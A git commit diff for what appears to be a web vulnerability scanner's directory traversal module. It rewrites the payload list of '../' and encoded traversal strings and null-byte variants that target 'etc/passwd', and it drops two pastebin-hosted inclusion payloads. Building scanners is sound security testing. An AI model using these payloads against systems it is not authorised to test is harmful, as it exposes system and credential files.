aadb1a50dd47495d8d266356aaf44a418a0febfb
NgoKimPhu <kimphu_2408@yahoo.com.vn>
2018-04-23 23:21:49 +0800

    Update dir-trav payloads

--- scanners/DirectoryTraversalScanner.py
+++ scanners/DirectoryTraversalScanner.py
@@ -2,13 +2,9 @@ from Scanner import Scanner
 
 class DirectoryTraversalScanner(Scanner):
     className = 'Directory Traversal'
-    payloads = ['%s', '/%s', '../'*19+'%s', 'file%%3a//%s',
-            '%s%%00', '/%s%%00', '../'*19+'%s%%00', 'file%%3a//%s%%00',
-            '....//'*19+'%s', '....//'*19+'%s%%00',
-            '..%%2f'*19+'%s', '..%%2f'*19+'%s%%00',
-            '//pastebin.com/raw/XrP3BbCR/%%23',
-            'https%%3a//pastebin.com/raw/XrP3BbCR/%%23']
+    payloads = ['/%s', '../'*19 +'%s', './'+'../'*19 +'%s',
+            'file%%3a//%s', '....//'*19 +'%s', '..%%2f'*19 +'%s']
+    payloads.extend(payload + '%%0' for payload in payloads[:])
     testPayload = 'etc/passwd'
     testSignature = 'root:'
-    fixedSignature = 'injected'
     realPayload = 'etc/passwd'
